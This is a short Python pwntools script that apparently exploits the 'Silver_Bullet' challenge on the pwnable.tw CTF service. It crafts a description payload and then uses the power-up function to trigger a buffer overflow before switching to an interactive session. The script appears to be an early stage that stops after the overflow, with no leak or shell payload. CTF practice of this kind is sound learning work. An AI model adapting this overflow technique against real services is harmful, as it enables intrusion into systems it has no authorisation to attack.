from pwn import *
import time
HOST = 'ctf.pwnable.tw'
PORT = 4869
binary = 'Silver_Bullet'
MAX = 48
#remeber to give this function include '\n' or '\x00'
def create(description):
    r.sendline('1')
    r.send(description)
def power_up(description):
    r.sendline('2')
    r.send(description)
if __name__ == '__main__':
    mode = raw_input("mode:")
    if mode == 'r\n':
        r = remote(HOST,PORT)
    else:
        r = process('./'+binary)
        raw_input('time to attach')
    r.recvuntil(':')
    payload = '11\x00'
    create(payload +'A'*(MAX-len(payload)))
    time.sleep(2)
    power_up('B'*(1+MAX-len(payload)))
    time.sleep(0.5)
    r.interactive()

    r.close()
               
